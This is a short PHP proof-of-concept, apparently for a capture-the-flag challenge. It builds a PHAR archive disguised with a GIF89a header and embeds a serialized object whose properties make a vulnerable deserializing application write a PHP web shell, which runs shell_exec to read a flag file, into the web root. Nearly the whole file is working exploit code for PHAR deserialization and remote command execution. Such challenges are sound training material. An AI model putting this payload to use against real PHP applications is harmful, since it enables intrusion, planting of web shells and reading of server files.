<?php

// PoC for Challenge
// William Moody
// 10.04.2021

class Message
{
    public function __construct()
    {
        $this->to = "<?php echo shell_exec('cat ../flag.txt'); ?>";
        $this->filePath = "/var/www/html/images/shell.php";
    }
}

$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a;<?php __HALT_COMPILER(); ?>");

$payload = new Message;
$phar->setMetadata($payload);

$phar->addFromString("poc.txt","What would you do if you weren't afraid?");
$phar->stopBuffering();
